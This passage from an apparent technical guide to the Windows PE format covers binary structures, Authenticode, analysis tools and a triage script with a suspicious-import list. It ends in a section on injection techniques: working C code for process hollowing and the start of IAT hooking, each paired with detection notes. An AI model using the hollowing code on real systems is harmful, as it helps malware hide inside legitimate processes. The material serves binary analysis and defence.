**XFG (`GuardXFGCheckFunctionPointer`, etc.).** eXtended Flow Guard, which augments CFG with type-hash matching: every function gets a hash of its prototype, and indirect calls verify that the target's hash matches the call site's expected hash. This raises the bar substantially — even a CFG-valid function (one whose address is set in the bitmap) cannot be called through a site that expects a different signature.

**`CHPEMetadataPointer`.** Used on ARM64EC (Compiled Hybrid PE — code-page-aware, jumping between ARM64 native and emulated x64).

**`DynamicValueRelocTable*`.** Used by retpoline metadata so the kernel/user-mode loader can patch indirect branches based on platform mitigations.

**`CastGuardOsDeterminedFailureMode`** and related fields — type-confusion mitigation metadata.

A hardening report on a Windows binary should report the matrix `{has /GS cookie, has SafeSEH (x86), has CFG, has XFG, CET shadow-stack compatible, retpoline-aware}` from this directory. None of these are visible from `DllCharacteristics` alone; the load configuration is the source of truth for most of them.

---

## 12. Exception data: `.pdata` and `RUNTIME_FUNCTION`

x86_64 and ARM64 do table-based exception handling. Where x86 SEH worked by linking handler records onto a stack list at function entry (which the OS could then walk on exception), x64 SEH attaches no per-function code at runtime — instead, the exception directory (data directory 3) contains static metadata describing every function in the image.

```c
typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY {  /* x64 */
    DWORD BeginAddress;        /* RVA of function start */
    DWORD EndAddress;          /* RVA past function end */
    DWORD UnwindData;          /* RVA of UNWIND_INFO */
} RUNTIME_FUNCTION;
```

The array is sorted by `BeginAddress`. Given a faulting RIP, the dispatcher binary-searches for the function containing it and follows `UnwindData` to an `UNWIND_INFO` structure:

```c
typedef struct _UNWIND_INFO {
    UBYTE Version : 3;
    UBYTE Flags : 5;             /* UNW_FLAG_EHANDLER, UNW_FLAG_UHANDLER, UNW_FLAG_CHAININFO */
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[CountOfCodes];   /* describes prolog operations */
    /* optional: ExceptionHandler RVA + handler-specific data, if EHANDLER/UHANDLER */
    /* optional: chained RUNTIME_FUNCTION, if CHAININFO */
} UNWIND_INFO;
```

The `UnwindCode` array describes, in reverse order, the operations the function's prolog performed (push register, allocate stack, set frame pointer). The unwinder replays these in reverse to reconstruct the caller's state.

If `UNW_FLAG_EHANDLER` is set, the structure is followed by a `DWORD` RVA of the language-specific exception handler and then handler-specific data (for C++, this is the scope table describing try/catch ranges and destructor lifetimes).

This metadata is critical for several non-exception purposes too. Stack walkers in profilers and debuggers use the unwind tables to walk frames without requiring frame pointers; ETW kernel-stack collection on x64 depends entirely on `.pdata`. A binary with an empty or corrupted `.pdata` produces broken stacks in any tool that relies on it — and there is no fall-back.

ARM64 has its own format with packed and unpacked variants. `RUNTIME_FUNCTION` on ARM64 may carry the unwind data inline (packed format, used for simple prologs that fit a fixed pattern) or reference an external `.xdata` blob (unpacked format, used for more complex prologs). The packed format is a single DWORD encoding "stack adjustment, register saves, frame pointer setup" in a constrained vocabulary; unpacked is structured similarly to x64.

Security note: an attacker who can write to `.pdata` (rare; it is normally read-only) can subvert exception dispatch — pointing `UNWIND_INFO` at a forged structure with an attacker-controlled `ExceptionHandler` RVA. Exploits along these lines have appeared historically. CFG validation of exception handler RVAs (the `IMAGE_GUARD_*_PRESENT` flags) closes most of the practical paths.

---

## 13. The debug directory and CodeView

The debug directory (data directory 6) is an array of `IMAGE_DEBUG_DIRECTORY`:

```c
typedef struct _IMAGE_DEBUG_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion, MinorVersion;
    DWORD Type;
    DWORD SizeOfData;
    DWORD AddressOfRawData;     /* RVA */
    DWORD PointerToRawData;     /* file offset */
} IMAGE_DEBUG_DIRECTORY;
```

The `Type` discriminates the entry. The interesting types:

**`IMAGE_DEBUG_TYPE_CODEVIEW` (2).** Points at a small CV record describing where the PDB lives. The current format (RSDS):

```c
struct CV_INFO_PDB70 {
    DWORD CvSignature;          /* 'RSDS' = 0x53445352 */
    GUID  Signature;            /* PDB GUID */
    DWORD Age;                  /* PDB age */
    char  PdbFileName[];        /* NUL-terminated UTF-8 */
};
```

The `(GUID, Age)` pair uniquely identifies a PDB; symbol servers index by `<filename>/<GUID><Age>/<filename>`. Microsoft's public symbol server (`https://msdl.microsoft.com/download/symbols`) serves PDBs for system binaries via this scheme. A defender's analysis pipeline that needs symbols against a binary should extract this record, query the appropriate symbol server, and cache.

The `PdbFileName` is whatever the linker recorded — frequently an absolute path on the build machine (`D:\agent\_work\src\foo.pdb`). This leaks build-environment information; some hardened builds explicitly strip the path component, leaving only the basename.

**`IMAGE_DEBUG_TYPE_REPRO` (16).** Reproducible build marker. Presence indicates the binary was built reproducibly; the `Characteristics` field carries the hash that derived the timestamp.

**`IMAGE_DEBUG_TYPE_VC_FEATURE` (12), `IMAGE_DEBUG_TYPE_POGO` (13), `IMAGE_DEBUG_TYPE_ILTCG` (14).** Compile- and link-time feature markers. POGO records profile-guided optimization data presence; ILTCG records incremental link-time code generation.

**`IMAGE_DEBUG_TYPE_EX_DLLCHARACTERISTICS` (20).** Carries an extended DllCharacteristics value with bits beyond the optional header's 16-bit field — notably the CET-related ones: `IMAGE_DLLCHARACTERISTICS_EX_CET_COMPAT`, `IMAGE_DLLCHARACTERISTICS_EX_CET_COMPAT_STRICT_MODE`, `IMAGE_DLLCHARACTERISTICS_EX_CET_SET_CONTEXT_IP_VALIDATION_RELAXED_MODE`, etc. A CET-aware (shadow-stack-compatible) binary advertises so here.

**`IMAGE_DEBUG_TYPE_EMBEDDED_PORTABLE_PDB` (17).** Used in some .NET binaries — the PDB is embedded within the PE itself rather than referenced externally.

A few security-forensic uses for the debug directory:

PDB references frequently disclose the original source path, build user, build agent, and project structure on the build machine. Penetration-test reports based on harvested binaries lean heavily on this data.

The PDB GUID is a strong pivot for malware family clustering and for matching variants that share build infrastructure.

A binary with no debug directory at all is mildly anomalous on Windows — even release builds normally retain the CodeView reference for symbolication. Stripped-PDB-reference binaries are common in some malware families.

---

## 14. The resource directory

Resources are PE's bundled-asset mechanism: icons, dialog templates, version information, manifests, embedded files. The directory (data directory 2) is a tree, conventionally three levels deep: type → name/ID → language → data.

Each level is an `IMAGE_RESOURCE_DIRECTORY`:

```c
typedef struct _IMAGE_RESOURCE_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion, MinorVersion;
    WORD  NumberOfNamedEntries;
    WORD  NumberOfIdEntries;
    /* IMAGE_RESOURCE_DIRECTORY_ENTRY[] follows, named first then ID */
} IMAGE_RESOURCE_DIRECTORY;

typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union {
        struct { DWORD NameOffset : 31; DWORD NameIsString : 1; };
        DWORD Name;
        WORD  Id;
    };
    union {
        DWORD OffsetToData;
        struct { DWORD OffsetToDirectory : 31; DWORD DataIsDirectory : 1; };
    };
} IMAGE_RESOURCE_DIRECTORY_ENTRY;
```

The high bit of `OffsetToData` distinguishes "this entry points at a subdirectory" from "this entry points at a leaf data descriptor"; the high bit of `Name` distinguishes named entries (Unicode strings stored elsewhere in the section) from numeric ID entries. All offsets are relative to the start of the resource section.

Leaves are `IMAGE_RESOURCE_DATA_ENTRY { DWORD OffsetToData; DWORD Size; DWORD CodePage; DWORD Reserved; }` — a pointer (RVA) and length to the actual resource bytes.

Resource types are well-known IDs at the first level of the tree: `RT_CURSOR` (1), `RT_BITMAP` (2), `RT_ICON` (3), `RT_MENU` (4), `RT_DIALOG` (5), `RT_STRING` (6), `RT_FONT` (8), `RT_ACCELERATOR` (9), `RT_RCDATA` (10) — arbitrary user data, `RT_MESSAGETABLE` (11), `RT_GROUP_CURSOR` (12), `RT_GROUP_ICON` (14), `RT_VERSION` (16), `RT_HTML` (23), `RT_MANIFEST` (24).

Two of these are security-prominent:

**`RT_RCDATA`.** Arbitrary user-supplied bytes. The standard hiding place for embedded payloads, configuration blobs, secondary executables, encrypted scripts. Static analysis should always enumerate `RT_RCDATA` resources and at least apply file-type detection (magic bytes) to each — a PE-in-PE here is a strong second-stage indicator.

**`RT_MANIFEST`.** Embedded XML manifest controlling DPI awareness, comctl32 version, supported OS versions, requested execution level (`asInvoker` / `highestAvailable` / `requireAdministrator` — UAC behavior), and `uiAccess` (whether the application can interact with higher-integrity windows for accessibility purposes; abused historically for privilege-escalation tricks). A binary requesting `requireAdministrator` should be treated as expecting elevation; `uiAccess="true"` combined with non-Microsoft signing is anomalous.

**`RT_VERSION`.** The version-info resource. Contains `FileVersion`, `ProductVersion`, `CompanyName`, `ProductName`, `OriginalFilename`, `InternalName`, `LegalCopyright`, etc. Frequently spoofed by malware to impersonate trusted binaries (a NotPetya variant claimed to be from "Microsoft Corporation"); should never be trusted as identity. For provenance, only Authenticode signing matters.

---

## 15. The certificate table and Authenticode

Data directory 4 is unique among the sixteen: its `VirtualAddress` is a **file offset**, not an RVA, because the certificate data is not loaded into memory by the PE loader. It points at one or more `WIN_CERTIFICATE` entries:

```c
typedef struct _WIN_CERTIFICATE {
    DWORD dwLength;             /* total entry size including this header */
    WORD  wRevision;            /* 0x0200 = WIN_CERT_REVISION_2_0 */
    WORD  wCertificateType;     /* 0x0002 = WIN_CERT_TYPE_PKCS_SIGNED_DATA */
    BYTE  bCertificate[];       /* ASN.1 DER PKCS#7 SignedData blob */
} WIN_CERTIFICATE;
```

The `bCertificate` blob is a PKCS#7 SignedData structure. Inside it:

The `contentInfo` is an SpcIndirectDataContent (Microsoft's wrapper) whose `messageDigest` field carries the **Authenticode hash** of the PE — a SHA-256 (modern) hash computed over the file with three exclusions: the optional header's `CheckSum` field (because that field is set after signing), the certificate table data directory entry (because the directory entry is updated when the signature is appended), and the certificate data itself (which is being signed and so cannot include itself). The exclusion ranges are part of the Authenticode specification.

The `signerInfos` carries the actual signature: signer certificate, signed attributes (including the message digest and the signing time), and the encrypted-by-signer-key signature. The certificate chain up to a trusted root is included in the SignedData's `certificates` field.

Optional unsigned attributes can carry RFC 3161 timestamps (so the signature remains valid after the signer's certificate expires), nested signatures (one PE can be signed multiple times — typically a SHA-1 signature for legacy compatibility plus a SHA-256 signature for modern requirements; the secondary signatures are nested as unsigned attributes of the primary), and **page hashes** (per-page hash arrays so the OS can validate individual pages of a signed binary against tampering, used in protected-process scenarios).

Verification is performed by `WinVerifyTrust` (or, in the kernel, by `CI.dll` and friends): hash the file using the Authenticode rules, compare to the embedded digest, validate the PKCS#7 signature, walk the certificate chain to a trusted root, check revocation (CRL/OCSP unless disabled), apply policy (does the certificate's EKU permit code signing? Is the issuer in a trusted set?).

Catalog-signed binaries (`.cat` files) are an alternate path: the binary itself carries no certificate, but its hash appears in a separately-signed catalog file. Most Windows components are catalog-signed rather than directly signed for OS-update efficiency.

Security notes:

A signature only proves who signed; it does not prove anything about behavior. Stolen code-signing certificates remain a recurring problem (Stuxnet famously used certificates stolen from Realtek and JMicron; many subsequent campaigns have followed); revocation is slow and unreliable. Defenders should track unusual signers and maintain reputation scoring on certificates, not just trust any valid chain.

The Authenticode hash exclusion regions create a potential evasion path: bytes inserted into the certificate table after the signed data, or bytes appended to the file beyond the section data, are not covered by the hash. Microsoft has tightened this over the years (notably with the 2013 MS13-098 patch that, as a configurable mitigation, refused to consider trailing bytes after the certificate table as part of a valid signature), but legacy parsers and some third-party tools still treat such files as validly signed. This is the technique behind several PE polyglots.

---

## 16. The CLR header and managed code

Managed (.NET) PE binaries carry an `IMAGE_COR20_HEADER` referenced from data directory 14 (also called the COM Descriptor directory for historical reasons):

```c
typedef struct IMAGE_COR20_HEADER {
    DWORD                   cb;                          /* size of this struct */
    WORD                    MajorRuntimeVersion;
    WORD                    MinorRuntimeVersion;
    IMAGE_DATA_DIRECTORY    MetaData;                    /* RVA + size of metadata blob */
    DWORD                   Flags;                       /* COMIMAGE_FLAGS_* */
    union {
        DWORD               EntryPointToken;             /* IL only */
        DWORD               EntryPointRVA;               /* native entry */
    };
    IMAGE_DATA_DIRECTORY    Resources;
    IMAGE_DATA_DIRECTORY    StrongNameSignature;
    IMAGE_DATA_DIRECTORY    CodeManagerTable;            /* unused */
    IMAGE_DATA_DIRECTORY    VTableFixups;
    IMAGE_DATA_DIRECTORY    ExportAddressTableJumps;
    IMAGE_DATA_DIRECTORY    ManagedNativeHeader;         /* for NGEN / ReadyToRun */
} IMAGE_COR20_HEADER;
```

`Flags` bits include `COMIMAGE_FLAGS_ILONLY` (assembly contains no native code), `COMIMAGE_FLAGS_32BITREQUIRED` / `COMIMAGE_FLAGS_32BITPREFERRED` (bitness constraints), `COMIMAGE_FLAGS_STRONGNAMESIGNED` (the strong-name signature in `StrongNameSignature` is populated), `COMIMAGE_FLAGS_NATIVE_ENTRYPOINT` (entry point is native code, not an IL token), `COMIMAGE_FLAGS_TRACKDEBUGDATA`.

The metadata blob begins with a header containing the magic `BSJB` (`0x424A5342`), version string, and a stream directory. The streams:

- `#~` — the metadata tables themselves (compressed binary form). Tables include `Module`, `TypeRef`, `TypeDef`, `Field`, `MethodDef`, `Param`, `InterfaceImpl`, `MemberRef`, `Constant`, `CustomAttribute`, `Assembly`, `AssemblyRef`, `File`, `ExportedType`, `ManifestResource`, `NestedClass`, `GenericParam`, `MethodSpec`, `GenericParamConstraint`, and others. ECMA-335 documents 38 standard tables.
- `#Strings` — UTF-8 string heap, indexed by metadata fields like `MethodDef.Name`.
- `#US` — user string heap, indexed by `ldstr` IL instructions.
- `#GUID` — GUID heap.
- `#Blob` — variable-length binary heap, used for signatures (method signatures, field signatures, type signatures), constants, and so on.

Method bodies are referenced from `MethodDef` table entries by RVA. Each body has a tiny header (1 byte: `0x02 | (size << 2)` for stacks ≤ 8 and methods ≤ 64 bytes) or a fat header (12 bytes, with maximum stack size, local variable signature token, and exception handling section pointers) followed by the IL bytecode.

IL bytecode is a stack-based instruction set: `ldarg.0` / `ldfld <token>` / `call <token>` and so on, with `<token>` being a metadata table reference (high byte selects table, low three bytes index it).

Security relevance:

The CLR's reflection emit and dynamic assembly capabilities mean that a .NET binary can construct and execute code at runtime that does not appear in any static analysis. PowerShell, in particular, is a hostile environment for static analysis: the relevant cmdlets often execute reflectively-generated code. AMSI (Antimalware Scan Interface) is the modern hook point — managed runtimes call into AMSI before executing reflectively-loaded code, giving AVs/EDRs a chance to inspect the in-memory IL.

Strong-name signing (`StrongNameSignature` populated) is a separate concept from Authenticode. Strong names use a developer-controlled key pair; they identify the assembly's originator but bind to no chain of trust. Authenticode is the OS-recognized signing scheme; strong naming is a CLR-internal scheme.

The `EntryPointToken` for an `ILONLY` assembly references a `MethodDef` row, not a code address. The CLR resolves the token to the method body and JITs it. Defender note: an assembly with `ILONLY` and a non-trivial native PE entry point is anomalous (it should have a tiny `_CorExeMain` stub or — modern — no entry point at all).

---

## 17. AppContainer and UWP

AppContainer is a sandboxing primitive — a heavily constrained user-mode execution environment with its own integrity level (`AppContainer`, lower than the standard `Low`), a restricted token, and a per-process namespace for objects (registry, named pipes, base named objects). UWP (Universal Windows Platform) apps run inside AppContainer by default; certain Win32 apps opt in via manifest.

A binary's AppContainer-awareness is signaled by `IMAGE_DLLCHARACTERISTICS_APPCONTAINER` (0x1000) in the optional header. The flag tells the loader the binary is intended to run inside an AppContainer; the loader (and the Win32 subsystem) refuse to load AppContainer-marked binaries outside an AppContainer process and vice versa for some system DLLs.

Package identity is the CLR-style identity tuple for a UWP package: `Publisher`, `Name`, `Version` (4-part), `Architecture`, `ResourceID`. The publisher is a Distinguished Name (`CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US`) tied to the publisher's certificate; combined with the package name, it forms a globally-unique package family. The full package identity hashes to a `PackageFamilyName` (`FamilyName_PublisherID`) and a `PackageFullName` that includes version and architecture.

The package's manifest (`AppxManifest.xml`) declares capabilities — coarse-grained permissions like `internetClient`, `picturesLibrary`, `webcam`, `documentsLibrary`. Each capability translates to a SID added to the AppContainer token, and access checks against capability-protected objects compare the token's capability SIDs. This is functionally similar to Linux's capability model, but at the package level rather than per-process.

The AppContainer profile lives in the registry under `HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Mappings\<SID>` and tracks the package's storage roots, named-object scope, and other per-AppContainer state.

Security notes:

AppContainer is the strongest standard sandbox Windows offers in user mode. Browser sandboxes (Edge, Chrome on Windows) lean on it; Office Protected View uses it.

AppContainer escapes — finding ways to interact with higher-integrity surfaces from within an AppContainer — are a recurring research area. Notable historical paths: capability gaps in COM brokers, kernel attack surface reachable from AppContainer (the EOP of choice for many sandbox escapes), and the loosely-locked `\Sessions\<id>\BaseNamedObjects\Restricted` namespace.

A non-UWP signed binary with `IMAGE_DLLCHARACTERISTICS_APPCONTAINER` set is unusual; either it is a sandboxing helper (browser-renderer-sandbox kind) or it is mis-flagged.

---

## 18. Cross-format synthesis: PE versus ELF

A short comparison table for orientation when working both formats:

| Concept                            | ELF                                                | PE/COFF                                                          |
|------------------------------------|----------------------------------------------------|------------------------------------------------------------------|
| Identity                           | `e_ident` magic, `e_type`                          | DOS magic + PE signature, `IMAGE_FILE_HEADER.Characteristics`    |
| Position-independent loading       | PIE (`ET_DYN` + `DF_1_PIE`), needs RELRO+BIND_NOW  | ASLR (`DYNAMIC_BASE` + populated `.reloc`), needs CFG/XFG too    |
| Imports                            | `.dynsym` + `.rela.plt` via PLT                    | Import directory + IAT, called via indirect through IAT slot      |
| Export                             | `.dynsym` global symbols                           | Export directory: EAT + name + ordinal tables                     |
| Lazy resolution                    | Lazy binding via `_dl_runtime_resolve` / GOT/PLT   | Delay-load via `__delayLoadHelper2` / delay IAT                  |
| Relocations                        | `.rela.dyn` typed; `R_X86_64_RELATIVE` etc.       | `.reloc` block-structured; `IMAGE_REL_BASED_DIR64` etc.          |
| Constructors / destructors         | `DT_PREINIT_ARRAY`, `DT_INIT_ARRAY`, `DT_FINI_ARRAY` (Ch 1B) | TLS callbacks, DllMain, `_DllMainCRTStartup`         |
| Thread-local storage               | `PT_TLS` template + dtv + `__tls_get_addr` (Ch 1B) | TLS directory + `AddressOfIndex` + `_tls_array`                 |
| Exception handling                 | `.eh_frame` + `.eh_frame_hdr` (Ch 1B)              | `.pdata` + `RUNTIME_FUNCTION` + `UNWIND_INFO`                    |
| Stack canary                       | `__stack_chk_guard` from libc; `-fstack-protector` | `__security_cookie` from CRT; `/GS`                              |
| Indirect-call protection           | CET IBT + clang/GCC CFI                            | CFG (bitmap), XFG (type-hash), CET (ENDBR + shadow stack)       |
| Code signing                       | Detached (Linux package signatures); IMA (Ch later) | Authenticode (embedded PKCS#7) and catalog signing              |
| Debug info                         | `.debug_*` DWARF, `.gnu.build-id` for matching     | External PDB referenced by GUID/Age in CodeView debug entry      |
| Sandboxing flag                    | seccomp at runtime; no static flag                 | `IMAGE_DLLCHARACTERISTICS_APPCONTAINER` + manifest capabilities   |
| Hardening posture surface          | Program headers, `DT_FLAGS`, `DT_FLAGS_1`          | `DllCharacteristics`, `IMAGE_DEBUG_TYPE_EX_DLLCHARACTERISTICS`, load config |

Two general observations from this table:

PE concentrates more security metadata in dedicated structures (load configuration, debug directory extended characteristics, manifest-declared capabilities) than ELF does. ELF distributes the same information across the dynamic table, the program headers, and various GNU-specific notes.

PE has historically been more eager about adopting new mitigations as additional structures (CFG, then XFG, then CET, each adding fields), whereas ELF/glibc has tended to rely on toolchain conventions and a small number of segment types. The trade-off is that a PE hardening report is a long matrix; an ELF one is shorter but requires more inference.

---

## 19. PE Analysis Tools

### 19.1 Automated triage with `pefile`

```python
#!/usr/bin/env python3
"""Automated PE triage using pefile."""
import pefile, math, hashlib, sys, datetime

def entropy(data):
    """Shannon entropy of a byte buffer. Range 0.0 - 8.0."""
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    ent = 0.0
    for f in freq:
        if f > 0:
            p = f / len(data)
            ent -= p * math.log2(p)
    return ent

SUSPICIOUS_IMPORTS = {
    "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
    "NtUnmapViewOfSection", "NtWriteVirtualMemory", "QueueUserAPC",
    "SetThreadContext", "NtCreateSection", "NtMapViewOfSection",
    "RtlCreateUserThread", "NtQueueApcThread",
    "IsDebuggerPresent", "NtQueryInformationProcess",
    "GetProcAddress", "LoadLibraryA", "LoadLibraryW",
    "AdjustTokenPrivileges", "OpenProcessToken",
    "CryptEncrypt", "CryptDecrypt", "CryptAcquireContextA",
    "InternetOpenA", "InternetOpenUrlA", "HttpSendRequestA",
    "URLDownloadToFileA", "WinExec", "ShellExecuteA",
}

def triage(path):
    with open(path, "rb") as f:
        raw = f.read()
    file_sha256 = hashlib.sha256(raw).hexdigest()
    pe = pefile.PE(data=raw)

    # --- header fields ---
    machine = pe.FILE_HEADER.Machine
    timestamp = pe.FILE_HEADER.TimeDateStamp
    try:
        link_time = datetime.datetime.utcfromtimestamp(timestamp).isoformat() + "Z"
    except (OSError, ValueError):
        link_time = f"invalid ({timestamp:#010x})"
    ep_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    image_base = pe.OPTIONAL_HEADER.ImageBase
    subsystem = pe.OPTIONAL_HEADER.Subsystem
    dll_chars = pe.OPTIONAL_HEADER.DllCharacteristics

    print(f"SHA-256        : {file_sha256}")
    print(f"Machine        : {machine:#06x}")
    print(f"Link time      : {link_time}")
    print(f"Entry point RVA: {ep_rva:#010x}")
    print(f"ImageBase      : {image_base:#018x}")
    print(f"Subsystem      : {subsystem}")

    # --- mitigation flags ---
    aslr    = bool(dll_chars & 0x0040)
    dep     = bool(dll_chars & 0x0100)
    cfg     = bool(dll_chars & 0x4000)
    hieva   = bool(dll_chars & 0x0020)
    noseh   = bool(dll_chars & 0x0400)
    appcon  = bool(dll_chars & 0x1000)
    force_i = bool(dll_chars & 0x0080)
    print(f"\nMitigations    : ASLR={aslr}  DEP={dep}  CFG={cfg}  "
          f"HighEntropyVA={hieva}  NoSEH={noseh}  "
          f"AppContainer={appcon}  ForceIntegrity={force_i}")

    # --- section entropy ---
    print(f"\n{'Section':<12} {'VirtAddr':>10} {'VirtSize':>10} "
          f"{'RawSize':>10} {'Entropy':>8} {'Flags'}")
    for sec in pe.sections:
        name = sec.Name.rstrip(b"\x00").decode("utf-8", errors="replace")
        data = sec.get_data()
        ent  = entropy(data)
        chars = []
        if sec.Characteristics & 0x20000000: chars.append("X")
        if sec.Characteristics & 0x40000000: chars.append("R")
        if sec.Characteristics & 0x80000000: chars.append("W")
        flag_str = "".join(chars)
        marker = ""
        if ent > 7.0:
            marker = " [PACKED?]"
        if "X" in flag_str and "W" in flag_str:
            marker += " [W^X]"
        print(f"  {name:<10} {sec.VirtualAddress:#010x} "
              f"{sec.Misc_VirtualSize:>10} {sec.SizeOfRawData:>10} "
              f"{ent:>8.4f} {flag_str}{marker}")

    # --- suspicious imports ---
    found = set()
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            for imp in entry.imports:
                if imp.name and imp.name.decode("utf-8", "replace") in SUSPICIOUS_IMPORTS:
                    found.add(f"{entry.dll.decode()}!{imp.name.decode()}")
    if found:
        print(f"\nSuspicious imports ({len(found)}):")
        for f in sorted(found):
            print(f"  {f}")

    # --- TLS callbacks ---
    if hasattr(pe, "DIRECTORY_ENTRY_TLS"):
        cbs = pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks
        if cbs:
            print(f"\nTLS callback array VA: {cbs:#018x}  [ANTI-DEBUG RISK]")

    # --- Authenticode presence ---
    cert_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
    if cert_dir.VirtualAddress and cert_dir.Size:
        print(f"\nAuthenticode   : present (offset {cert_dir.VirtualAddress:#x}, "
              f"size {cert_dir.Size})")
    else:
        print("\nAuthenticode   : ABSENT")

    # --- EP outside .text ---
    ep_section = None
    for sec in pe.sections:
        if sec.VirtualAddress <= ep_rva < sec.VirtualAddress + sec.Misc_VirtualSize:
            ep_section = sec.Name.rstrip(b"\x00").decode("utf-8", errors="replace")
            break
    if ep_section and ep_section != ".text":
        print(f"EntryPoint in  : {ep_section}  [ANOMALOUS — expected .text]")

    pe.close()

if __name__ == "__main__":
    triage(sys.argv[1])
```

### 19.2 dumpbin (Visual Studio)

```
dumpbin /headers      pe.exe     # DOS, COFF, optional headers, section table
dumpbin /imports      pe.exe     # import directory: DLLs, functions, hints
dumpbin /exports      pe.dll     # export directory: EAT, forwarders
dumpbin /loadconfig   pe.exe     # load config: /GS cookie, CFG tables, XFG, CET
dumpbin /tls          pe.exe     # TLS directory and callback addresses
dumpbin /relocations  pe.exe     # base relocation blocks
dumpbin /dependents   pe.exe     # recursive DLL dependency tree
```

### 19.3 Sysinternals sigcheck

```
sigcheck64.exe -a -h <binary>
```

`-a` prints all fields (publisher, description, product version, file version, machine type, signing status, catalog/embedded, thumbprint, algorithm, timestamp, entropy). `-h` adds file hashes (MD5, SHA-1, SHA-256, PESHA-1, PESHA-256, IMP — the imphash). Output is single-line-per-file or CSV (`-c`), suitable for fleet-wide sweeps.

### 19.4 PowerShell quick checks

```powershell
# Authenticode verification
Get-AuthenticodeSignature .\target.exe | Format-List *

# Process mitigation policy (ASLR, DEP, CFG, CET) for a running process
Get-ProcessMitigation -Name explorer.exe

# System-wide mitigation defaults
Get-ProcessMitigation -System
```

---

## 20. PE Injection Techniques

### 20.1 Process hollowing

Create a suspended process, unmap its image, write the payload, and resume. The core Win32 sequence:

```c
#include <windows.h>
#include <winternl.h>  /* NtUnmapViewOfSection */

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL hollow(LPCWSTR host, LPVOID payload, DWORD payload_size) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    /* 1. Create the host process SUSPENDED */
    if (!CreateProcessW(host, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    /* 2. Read PEB to find the host's ImageBase */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);

    PVOID remote_imagebase;
    /* PEB.ImageBaseAddress at PEB + 0x10 on x64 */
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10,
                      &remote_imagebase, sizeof(PVOID), NULL);

    /* 3. Unmap the original image */
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                       "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, remote_imagebase);

    /* 4. Allocate at the same base and write payload */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)
        ((PBYTE)payload + dos->e_lfanew);

    LPVOID alloc = VirtualAllocEx(pi.hProcess, remote_imagebase,
                                  nt->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    /* Write headers */
    WriteProcessMemory(pi.hProcess, alloc, payload,
                       nt->OptionalHeader.SizeOfHeaders, NULL);
    /* Write each section */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (PBYTE)alloc + sec[i].VirtualAddress,
            (PBYTE)payload + sec[i].PointerToRawData,
            sec[i].SizeOfRawData, NULL);
    }

    /* 5. Fix PEB ImageBase if payload has different preferred base */
    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10,
                       &nt->OptionalHeader.ImageBase,
                       sizeof(ULONGLONG), NULL);

    /* 6. Set entry point and resume */
    ctx.Rcx = (DWORD64)alloc + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
```

Detection surface: Sysmon EID 1 (process create) followed by EID 10 (process access with `PROCESS_VM_WRITE|PROCESS_VM_OPERATION`), then EID 25 (process tampering — image mismatch). Memory forensics: main module's on-disk image differs from its in-memory image (`windows.malfind` in Volatility 3).

### 20.2 Reflective DLL injection

The payload DLL loads itself into the target process without touching disk or calling `LoadLibrary`. Manual mapping steps:

1. Allocate RWX region in target (`VirtualAllocEx`).
2. Copy the DLL's PE into the allocated region.
3. Process the `.reloc` section: apply delta `(actual_base - preferred_ImageBase)` to every relocation entry.
4. Walk the import directory: for each DLL, call `LoadLibraryA` in the target (or resolve from already-loaded modules via PEB `InMemoryOrderModuleList`); for each function, resolve the address and patch the IAT slot.
5. Invoke TLS callbacks if the TLS directory is populated.
6. Call `DllMain(actual_base, DLL_PROCESS_ATTACH, NULL)`.

Because no `LoadLibrary` call occurs, the DLL does not appear in the PEB module list, and Sysmon EID 7 (image load) fires without a backing file path. Detection: scan for executable memory regions that contain a valid PE header but have no corresponding entry in the loaded-module list.

### 20.3 IAT hooking

Patch a single IAT entry to redirect calls through a detour:

```c
/* Hook MessageBoxA by overwriting the IAT slot */
void hook_iat(HMODULE hmod, const char *dll, const char *func,
              PVOID detour, PVOID *original) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hmod;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)
        ((PBYTE)hmod + dos->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)
        ((PBYTE)hmod + nt->OptionalHeader.DataDirectory[1].VirtualAddress);

    for (; imp->Name; imp++) {
        if (_stricmp((char *)hmod + imp->Name, dll) != 0) continue;
